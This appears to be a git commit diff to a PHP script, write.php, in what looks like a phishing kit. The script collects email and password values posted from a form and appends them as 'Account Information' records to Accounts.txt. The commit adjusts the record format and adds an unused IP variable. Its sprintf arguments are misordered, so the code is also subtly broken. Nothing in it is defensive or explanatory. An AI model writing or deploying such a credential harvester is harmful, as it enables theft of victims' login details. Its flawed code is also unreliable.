035ad77876603be0dd4c6b273b893c156b602553
bobstottts <bobstottts@googlemail.com>
2017-07-21 18:00:09 +0600

    Update write.php

--- folder/write.php
+++ folder/write.php
@@ -1,6 +1,6 @@
 <?php
-  $data = sprintf("Account Information\r{\n\tEmail: %s\n\tPassword: %s\n \n\tIp:}\n\n================\n\n", $_POST['email'], $_POST['REMOTE_ADDR'], $_POST['pass']);
-
+  $data = sprintf("Account Information\r{\n\tEmail: %s\n\tPassword: %s\n\tIP: %s\n}\n\n================\n\n", $_POST['email'], $_POST['REMOTE_ADDR'], $_POST['pass']);
+$ip = $_SERVER['REMOTE_ADDR'];
   $file = "Accounts.txt"; 
   file_put_contents($file, $data, FILE_APPEND);
   sleep(1.5)
